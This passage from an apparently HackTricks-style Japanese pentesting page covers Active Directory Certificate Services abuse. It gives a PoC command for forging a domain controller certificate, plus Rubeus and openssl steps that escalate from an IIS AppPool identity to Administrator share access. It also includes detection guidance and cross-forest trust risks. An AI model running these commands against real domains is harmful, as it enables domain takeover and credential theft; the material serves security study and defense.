- **CA** から攻撃者が制御する **`389` と `445`** へのネットワーク到達性
- 脆弱な / 未修正のCA request path（**2026年7月14日** のMicrosoft updateでは、**`cdc` のDC検証** と **解決されたSIDの比較** が追加されました）

取得した **`.pfx`** は **PKINIT** に使用でき、**`.ccache`** を生成できます。公開PoCの手順では、さらに **対象DCのNT hash** も取得できます。通常、これで **domainを完全に侵害** できます。

### 悪用

公開PoCは一連の手順を自動化します:<sup>[[1]](#references)</sup>

1. 攻撃者が制御する **machine account** を作成または再利用します。
2. `389` と `445` で **rogue LDAPおよびSMB/LSA listener** を起動します。
3. 攻撃者が制御する **`cdc`** 属性と、対象を示す **`rmd`** 属性を含む証明書要求を送信します。
4. CAに制御下のmachine accountとしてrogue listenerへの認証を行わせ、IDの照会には **対象DC** の属性を返します。
5. CA署名済みの **DC certificate** を受け取り、**PKINIT** に使用します。

```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```

PoCで使えるランタイムフラグ:

- `--listener <ip>`: `cdc`で通知するcallback IPを明示的に選択
- `--computer-name <NAME$>`: 新しいものを作成せず、既存のmachine accountを再利用

**運用上の注意:**

- PoCでは、**特権ポート**`389`と`445`にbindするため、**root**が必要です。
- exploitに成功すると、ローカルに**DC `.pfx`**と**Kerberos `.ccache`**が書き込まれます。
- 証明書は**Domain Controller account**にマッピングされるため、その後の操作には**certificate-based Kerberos auth**、**DCSync**、復元した**machine NT hash**の再利用などがあります。<sup>[[2]](#references)</sup>

## IIS AppPoolから同一ホストのAdministratorへの昇格

`ApplicationPoolIdentity`として動作するIIS poolは、ネットワークリソースへのアウトバウンドアクセスにホストの**computer account**を使用します。そのため、`IIS AppPool\<POOL>`としてコード実行できる場合、ローカルトークンの権限は低いままでも、CAが`HOST$`として認証するAD CSリクエストを送信できます。これはアウトバウンドIDの切り替えであり、トークンの偽装やPotato型のローカル昇格ではありません。<sup>[[19]](#references)[[20]](#references)</sup>

このチェーンには、ドメイン参加済みのIISホスト、RPC経由で到達可能なEnterprise CA、computerにenrollment権限が付与された公開済みのmachine-authentication template、PKINITのサポート、KDC/SMBへの到達性が必要です。カスタムpool identityではアウトバウンドprincipalが変わるため、`HOST$`だと想定する前に、poolが実際に`ApplicationPoolIdentity`を使っていることを確認してください。<sup>[[19]](#references)[[20]](#references)</sup>

### 攻撃者が制御する鍵によるenrollment

IISサーバー以外の場所で鍵ペアとCSRを生成し、秘密鍵は手元に保持してください。侵害したworkerから送信するのは**CSRのみ**です。[Certi-Bhai ASPX PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)は`CertificateAuthority.Request`をインスタンス化し、`CertificateTemplate:Machine`を設定して、`ICertRequest::Submit`を呼び出し、発行された証明書を返します。CA設定文字列`CAHOST\CA-NAME`を使用してください。通常の`Machine` templateはADからsubjectを構築するため、requesterがsubject/SANデータを指定する必要はありません。<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

返された証明書を、**対応する保持済みの鍵**と組み合わせてください。`certutil -MergePFX machine_cert.cer machine_cert.pfx`が機能するのは、Windowsが証明書をアクセス可能な秘密鍵にすでに関連付けられる場合のみです。別々のPEMファイルの場合は、PKCS#12を明示的に作成してください:<sup>[[19]](#references)[[23]](#references)</sup>

```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
  -out machine_cert.pfx -name 'HOST$'
```

PFXをPKINITに使用し、取得したcomputer TGTはすぐにinjectせず、base64形式で保持します。<sup>[[5]](#references)[[19]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
  /password:PFX_PASSWORD /nowrap
```

### S4U2Selfと同一ホスト上のサービス置換

S4U2Selfを使うと、サービスは別ユーザーの認可データを含む、自分自身宛てのチケットを取得できます。コンピューターのTGTがあれば、Rubeusで特権ユーザー用のチケットを要求し、返されたKRB-CRED内のサービス名をCIFSに書き換えて、インジェクトできます。これはローカルで「自分自身に委任する」プリミティブであり、S4U2Proxyや`msDS-AllowedToDelegateTo`エントリは必要ありません。<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>

```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
  /altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```

置換された ticket は、**同じコンピューターアカウント／key**（ここでは `HOST` 上の CIFS）で実行されるサービスのみで使用できます。ドメイン内の他のコンピューターでも使える Administrator ticket ではありません。また、ここで示した結果は、Administrator としての特権 SMB／filesystem access です。ローカルの `NT AUTHORITY\SYSTEM` プロセスを取得するには、別途 remote-execution の手順が必要です。<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### 検知と hardening

- CA 上で、Certification Services のイベント **4886**（要求の受信）と **4887**（発行）を関連付け、IIS server アカウントによる予期しない `Machine` template の要求を検知します。<sup>[[19]](#references)[[24]](#references)</sup>
- DC 上では、certificate pre-authentication が使われるとイベント **4768** に certificate のフィールドが含まれます。web-server アカウントによる通常と異なる PKINIT TGT 要求を alert 対象にします。続いて、特権を持つ偽装 identity と同じ host に関連する **4769** 要求を確認します。Rubeus の `/altservice` はクライアント側で KRB-CRED の service 名を書き換えるため、DC 側の 4769 service 名が `cifs` であることを必須条件にしないでください。<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- `w3wp.exe` による CA RPC endpoint への接続、予期しない ASPX ファイルの作成、Kerberos 認証を使った administrative share へのアクセス、secrets-dumping の活動を調査します。可能であれば app-tier から CA RPC/KDC/SMB へのアクセスを制限し、運用上不要なコンピューターの enrollment 権限や machine-authentication template を削除します。<sup>[[19]](#references)</sup>

## 証明書を使った Forest の侵害について受動態で解説

### 侵害された CA による Forest Trust の突破

**cross-forest enrollment** の構成は、比較的容易に行えます。resource forest の **root CA certificate** は管理者によって **account forest に公開**され、resource forest の **enterprise CA** certificate は各 account forest の `NTAuthCertificates` および AIA container に **追加**されます。つまり、この構成により、resource forest の **CA は、その PKI を管理する他のすべての forest を完全に制御できる**ようになります。この CA が**攻撃者に侵害された場合**、resource forest と account forest のすべてのユーザーの certificate が**偽造される可能性があり**、その結果、forest のセキュリティ境界が破られます。<sup>[[6]](#references)</sup>

### 外部 Principal に付与された Enrollment 権限

複数の forest が存在する環境では、Enterprise CA が **Authenticated Users または外部 Principal**（Enterprise CA が属する forest の外部にいるユーザー／グループ）に **enrollment および edit 権限を許可する certificate template を公開している場合**、注意が必要です。\
Trust を介して認証されると、AD によって **Authenticated Users SID** がユーザーの token に追加されます。そのため、ある domain に **Authenticated Users の enrollment 権限を許可する template を持つ Enterprise CA** がある場合、別の forest のユーザーがその template に **enrollment できる可能性があります**。同様に、template によって **外部 Principal に enrollment 権限が明示的に付与されている場合**、**forest 間の access-control 関係が作成され**、ある forest の Principal が別の forest の template に **enrollment できるようになります**。

どちらのケースでも、ある forest から別の forest への**攻撃対象領域が拡大**します。証明書 template の設定を攻撃者に悪用されると、外部 domain で追加の権限を取得されるおそれがあります。<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC リポジトリ](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Certighost の技術分析](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Active Directory Certificate Services の悪用](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9、ESC10、BloodHound GUI、新しい認証および要求 method など](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Key Trust Account Mapping を悪用したアカウント乗っ取り](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Enhanced Key (mis)Usage の物語](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – RPC 経由で AD Certificate Services に relay する](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: YubiHSM を使った ADCS CA への shell access](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13 の悪用手法](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14 の悪用手法](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Privilege Escalation（ESC1-ESC17）](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: ありふれた AD CS ESC ではない](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: 設定ミスと悪用](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – 「Delegate 2 Thyself」の再検討](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – IIS AD CS enrollment の PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – AD CS RPC Endpoint 経由での IIS AppPool からの Privilege Escalation](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Application Pool Identities](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – pkcs12 command](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Certification Services の監査](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – イベント 4768: Kerberos 認証 ticket が要求された](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – イベント 4769: Kerberos service ticket が要求された](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – AD CS PowerShell exploitation toolkit](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
